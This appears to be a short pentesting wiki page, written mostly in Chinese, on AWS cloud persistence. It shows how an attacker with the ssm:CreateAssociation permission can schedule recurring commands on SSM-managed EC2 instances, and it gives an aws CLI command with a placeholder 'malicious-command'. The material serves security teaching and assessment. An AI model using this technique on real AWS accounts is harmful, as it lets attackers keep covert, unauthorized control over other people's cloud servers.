# AWS - SSM Perssitence

{{#include ../../../../banners/hacktricks-training.md}}

## SSM

更多信息请参见：

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/README.md
{{#endref}}

### 使用 ssm:CreateAssociation for persistence

具有 **`ssm:CreateAssociation`** 权限的攻击者可以创建 State Manager Association，在由 SSM 管理的 EC2 实例上自动执行命令。这些 associations 可以配置为以固定间隔运行，使其适合用于无需交互式会话的 backdoor-like persistence。
```bash
aws ssm create-association \
--name SSM-Document-Name \
--targets Key=InstanceIds,Values=target-instance-id \
--parameters commands=["malicious-command"] \
--schedule-expression "rate(30 minutes)" \
--association-name association-name
```
> [!NOTE]
> 只要 EC2 实例由 Systems Manager 管理、SSM agent 正在运行，且攻击者有创建 associations 的权限，该持久化方法就能生效。它不需要交互式会话或显式的 ssm:SendCommand 权限。**重要：** `--schedule-expression` 参数（例如 `rate(30 minutes)`）必须遵守 AWS 的最小间隔 30 分钟。若要立即或一次性执行，请完全省略 `--schedule-expression` —— association 在创建后会执行一次。

{{#include ../../../../banners/hacktricks-training.md}}
